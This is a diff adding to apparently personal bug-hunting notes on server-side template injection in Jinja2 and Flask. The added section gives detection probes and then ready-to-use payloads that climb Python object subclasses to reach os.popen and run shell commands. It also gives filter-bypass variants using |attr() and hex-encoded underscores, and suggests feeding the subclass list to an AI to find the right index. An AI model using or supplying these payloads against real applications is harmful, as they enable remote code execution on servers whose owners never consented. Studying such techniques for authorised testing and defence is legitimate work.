@@ -37,7 +37,7 @@
 
 
 
-## where to find ssti
+## where to find ssti 
 
 	SSTI Hunting
 	├── Input Reflection Points
@@ -108,14 +108,47 @@
 	    order_id=safe_order_id)
 
 
+
+
+# how to detect 
+
+the flow: object / dict / module / callable
+	- how to test and detect :
+		1- start with calculate any num like 5* 5 in templatejinja2 -> {{5 *  5}}	
+		2- then try to see the configration {{config}}
+		3- how many class running now ->
+		 "".__class__.__base__.__subclasses__().__len__()
+		4- what is the name of the class "brute-force" ->  
+		   "".__class__.__base__.__subclasses__()[33].__name__		 
+		5- "".__class__.__base__.__subclasses__()[THE-INDEX-YOU-FOUND] 
+		 .__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read()
+	#- or use 
+		1- "".__class__.__mro__[1].__subclasses__() to show all class 
+		2- send all to AI to show the subclass you need and his index 'll run os
+		3- after got the index will run init built -> 
+		 {{"".__class__.__mro__[1].__subclasses__()[282].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}   | NOte: try all possible index 
+		 
+	#- OR The best one  
+		{{config.__class__.__init__.__globals__['os'].popen('ls').read()}} but 
+		with our encode -> {{config|attr('__class__')|attr('__init__')|attr('__globals__')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}} 
+	# getitem It is an alternative to the square brackets []
+
+	Tips :
+		in flask the func render_template() by default import request object so 
+		you can do that : {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
 # payload & bypass
 
-	the flow: object / dict / module / callable
 	
+
+
+
  - {{ (request is defined) and request.method }} in janja2 to know is request i exist 
 
 - bypass: 
-	encode . dot also encode __   (with hex to template  engine render it)
+	1- how to bypass . dot -> |attr() which is part of jinja2 template engine
+	2- how to bypass __  -> encode it with hex why hex not base64  or any encode  'cause the template engine  process it by default but if you wanna use base64 or anything else you can by  import them   __   (with hex to template  engine render it)
+	
+	 
 	
 		payload: request.application.__globals__['__builtins__']['__import__']
 		('os').popen('ls').read()
